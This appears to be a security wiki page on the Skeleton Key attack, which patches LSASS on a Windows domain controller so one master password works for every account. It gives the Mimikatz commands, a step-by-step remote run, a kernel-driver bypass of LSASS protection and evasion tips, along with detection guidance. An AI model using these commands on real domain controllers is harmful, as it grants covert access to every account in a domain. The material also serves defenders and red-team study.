---
title: Skeleton Key attack
slug: skeleton-key
aliases: [skeleton key, misc::skeleton, LSASS master password]
---

> **TL;DR:** Skeleton Key patches the LSASS process on a Domain Controller to add a master password that works alongside every user's real password. It requires Domain Admin, doesn't survive reboot, and is detectable via Sysmon driver loads and replication monitoring. A fast-but-fragile persistence mechanism.

## How it works

Mimikatz `misc::skeleton` patches the `msv1_0.dll` / `kerberos.dll` authentication routines in the DC's LSASS process memory. After patching:
- Every domain account authenticates with its normal password **OR** the skeleton key (default: `mimikatz`)
- The real password database is untouched — no AD object is modified
- The patch lives only in the LSASS process memory of the targeted DC

```
# On the Domain Controller (requires DA / SYSTEM on the DC)
mimikatz # privilege::debug
mimikatz # misc::skeleton

# Now authenticate as ANY user with password "mimikatz"
runas /user:DOMAIN\Administrator /netonly cmd
# Enter password: mimikatz → success
```

The skeleton key password can be customised in Mimikatz source but not via the command line in default builds.

## Preconditions

- **Domain Admin** (or equivalent) privileges on the target DC
- Ability to run code on the DC itself (local or via PSRemoting/WMI/SMB)
- LSASS must not be running as PPL (Protected Process Light) — if `RunAsPPL` is set, the standard patch fails
- Must be run on **each DC** you want the skeleton key active on — it's per-process, not replicated

## Step-by-step

```powershell
# 1. Verify you have DA and can reach the DC
whoami /groups | findstr "Domain Admins"

# 2. Check if LSASS is running as PPL
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL
# If RunAsPPL = 1, standard skeleton key fails

# 3. Run on the DC (via PSRemoting example)
Enter-PSSession -ComputerName DC01
# Upload and run mimikatz
.\mimikatz.exe "privilege::debug" "misc::skeleton" "exit"
# Output: "Skeleton Key patched" or "Patch OK"

# 4. Test — authenticate as any user with skeleton key
net use \\DC01\C$ /user:DOMAIN\anyuser mimikatz
# Should succeed
```

## PPL bypass variant

If LSASS runs as PPL (`RunAsPPL = 1`), load a kernel driver to remove protection:

```
# Mimikatz with mimidrv.sys (kernel driver)
mimikatz # !+                    # Load mimidrv.sys
mimikatz # !processprotect /process:lsass.exe /remove
mimikatz # misc::skeleton
mimikatz # !-                    # Unload driver
```

This requires `SeLoadDriverPrivilege` and the driver to be signed (or [[byovd-bring-your-own-vulnerable-driver]] to load unsigned). The driver load is highly visible.

## Limitations

| Limitation | Impact |
|---|---|
| **Doesn't survive DC reboot** | Must be re-applied after any restart |
| **Per-DC only** | Must patch each DC independently; no replication |
| **Requires DA** | Not a privilege escalation; it's persistence post-DA |
| **LSASS crash risk** | Patching LSASS can crash it; DC restarts, patch is gone |
| **PPL blocks it** | Modern DCs with `RunAsPPL` prevent the standard approach |
| **Single known password** | Default is `mimikatz`; defenders check for it |
| **No AES support (older versions)** | Some Mimikatz versions only patch RC4; AES-only environments reject it |

## Detection

### Event Log indicators

```xml
<!-- Sysmon Event ID 6 — Driver Loaded (mimidrv.sys) -->
<EventID>6</EventID>
<Data Name="ImageLoaded">C:\path\mimidrv.sys</Data>
<!-- Alert on any unsigned/untrusted kernel driver load on DCs -->

<!-- Sysmon Event ID 7 — Image Loaded in LSASS -->
<EventID>7</EventID>
<Data Name="Image">C:\Windows\System32\lsass.exe</Data>
<!-- Alert on DLL loads into lsass that aren't standard Windows -->

<!-- Security Event 4673 — Sensitive Privilege Use -->
<!-- misc::skeleton requires SeDebugPrivilege -->
```

### Active Directory indicators

```powershell
# Monitor for DS-Replication-Get-Changes permission abuse
# (not directly skeleton key, but often co-occurs)

# Check for Kerberos RC4 downgrade — skeleton key forces RC4
# If your domain enforces AES-only and RC4 auth succeeds, investigate

# Monitor DC LSASS process for unexpected module loads
Get-Process lsass -Module | Where-Object { $_.Company -ne "Microsoft Corporation" }
```

### Network indicators

- Authentication with the skeleton password produces valid Kerberos tickets but with RC4 encryption type (0x17) when the domain may expect AES (0x12)
- Volume of successful authentications from a single source using different accounts at unusual hours

### MDI / ATA detection

Microsoft Defender for Identity detects skeleton key via:
- Kerberos encryption downgrade (RC4 where AES expected)
- Anomalous authentication patterns
- Named detection: "Suspected Skeleton Key attack (encryption downgrade)"

## Comparison with other DC persistence

| Technique | Survives reboot | Modifies AD | Detection difficulty |
|---|---|---|---|
| Skeleton Key | No | No | Medium |
| [[golden-tickets]] | Yes (key-based) | No | Hard |
| [[dcsync]] | N/A (extraction) | No | Medium |
| [[adminsdholder-abuse]] | Yes | Yes | Medium |
| [[ad-persistence]] DCShadow | Yes | Yes (stealthy) | Hard |

## OPSEC pitfalls

- LSASS patching on a production DC is **high risk** — if LSASS crashes, the DC reboots and your patch (and possibly your session) is gone
- `mimidrv.sys` driver load is extremely loud; kernel driver loads on DCs should be near-zero in normal operations
- The default skeleton password `mimikatz` is checked by every DFIR playbook — if you must use this technique, modify the source
- If the target runs MDI, the encryption-downgrade alert fires almost immediately

## References

- [Mimikatz — misc::skeleton documentation](https://github.com/gentilkiwi/mimikatz/wiki)
- [ADSecurity — Skeleton Key](https://adsecurity.org/?p=1255)
- [MITRE ATT&CK — T1556.001 Domain Controller Authentication](https://attack.mitre.org/techniques/T1556/001/)
- [Microsoft — Defender for Identity skeleton key detection](https://learn.microsoft.com/en-us/defender-for-identity/credential-access-alerts)

See also: [[golden-tickets]], [[dcsync]], [[ad-persistence]], [[adminsdholder-abuse]], [[byovd-bring-your-own-vulnerable-driver]], [[diamond-and-sapphire-tickets]], [[kerberos]], [[defender-for-identity-evasion]]
